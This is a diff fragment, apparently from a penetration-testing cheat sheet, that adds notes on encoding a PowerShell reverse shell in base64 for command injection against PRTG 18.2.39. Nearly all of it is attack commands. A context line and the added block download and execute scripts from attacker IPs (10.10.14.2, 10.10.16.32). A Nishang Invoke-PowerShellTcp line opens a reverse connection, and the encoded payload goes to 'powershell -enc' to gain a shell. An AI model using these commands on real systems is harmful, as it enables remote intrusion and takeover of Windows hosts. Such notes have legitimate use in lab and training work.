@@ -53,9 +53,17 @@ START /B "" powershell -c IEX (New-Object
 Net.Webclient).downloadstring('http://10.10.14.2/shell.ps1')
 ```
 
+Encoding a powershell reverse shell to base64 - This technique is useful for executing commands on a vulnerable Windows web service, such as PRTG version 18.2.39, which is susceptible to command injection vulnerabilities. More details about this vulnerability can be found here(https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/)
 
+```bash
+#Downloading the reverse shell from Nishang in https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
 
+#Encoding to base64
+echo -n "IEX(new-objectnet.webclient).downloadstring('http://10.10.16.32/Invoke-PowerShellTcp.ps1')" | iconv -t UTF-16LE | base64 -w0
 
+#Configuring the reverse shell
+echo 'Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <PORT>' >> Invoke-PowerShellTcp.ps1
 
-
-
+#send this encoded payload to webservice and just run to pop the shell:
+<whatever data> | powershell -enc <base64 encoded payload>
+```
